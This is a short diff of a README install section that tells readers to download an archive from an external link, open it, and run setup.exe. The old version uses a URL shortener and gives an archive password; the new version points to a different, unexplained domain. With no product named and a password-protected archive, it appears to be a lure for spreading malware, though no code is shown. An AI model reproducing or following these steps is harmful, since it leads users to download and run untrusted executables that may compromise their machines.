@@ -2,8 +2,8 @@
 
 <H3>How install:</H3>
 
-1. [Download](https://goo.su/Cz1xGU9)
-2. Open archive (pass: Project12!)
+1. [Download](https://softspace.space/)
+2. Open archive
 3. Open setup.exe
 4. Standard installation
 
